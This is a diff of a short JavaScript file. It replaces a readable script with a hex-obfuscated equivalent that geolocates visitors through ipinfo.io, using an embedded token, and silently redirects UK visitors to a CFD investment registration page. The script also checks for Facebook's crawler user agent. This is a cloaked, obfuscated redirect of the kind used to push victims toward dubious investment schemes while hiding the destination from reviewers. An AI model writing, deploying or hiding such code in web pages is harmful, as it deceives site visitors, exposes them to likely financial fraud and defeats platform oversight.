@@ -1,15 +1,1 @@
-function isMobileDevice() {
-  return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
-}
-
-fetch('https://ipinfo.io/json?token=0784c654f65d07')
-  .then(response => response.json())
-  .then(data => {
-    const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
-    if (!isFacebookBot && data.country !== 'GB') {
-      // Si l'utilisateur n'est pas au Royaume-Uni et n'est pas un bot Facebook
-      // on ne redirige pas vers une autre page et on affiche simplement la page
-    } else if (data.country === 'GB') {
-      window.location.replace("https://cfd.fortuna-invest.com/register");
-    }
-  });
+var _0xf841=["\x6F\x72\x69\x65\x6E\x74\x61\x74\x69\x6F\x6E","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x49\x45\x4D\x6F\x62\x69\x6C\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x66\x61\x63\x65\x62\x6F\x6F\x6B\x65\x78\x74\x65\x72\x6E\x61\x6C\x68\x69\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x63\x6F\x75\x6E\x74\x72\x79","\x47\x42","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x66\x64\x2E\x66\x6F\x72\x74\x75\x6E\x61\x2D\x69\x6E\x76\x65\x73\x74\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x68\x65\x6E","\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x69\x6E\x66\x6F\x2E\x69\x6F\x2F\x6A\x73\x6F\x6E\x3F\x74\x6F\x6B\x65\x6E\x3D\x30\x37\x38\x34\x63\x36\x35\x34\x66\x36\x35\x64\x30\x37"];function isMobileDevice(){return ( typeof window[_0xf841[0]]!== _0xf841[1])|| (navigator[_0xf841[4]][_0xf841[3]](_0xf841[2])!==  -1)}fetch(_0xf841[14])[_0xf841[12]]((_0xda59x4)=>{return _0xda59x4[_0xf841[13]]()})[_0xf841[12]]((_0xda59x2)=>{const _0xda59x3=navigator[_0xf841[4]][_0xf841[6]](_0xf841[5]);if(!_0xda59x3&& _0xda59x2[_0xf841[7]]!== _0xf841[8]){}else {if(_0xda59x2[_0xf841[7]]=== _0xf841[8]){window[_0xf841[11]][_0xf841[10]](_0xf841[9])}}})
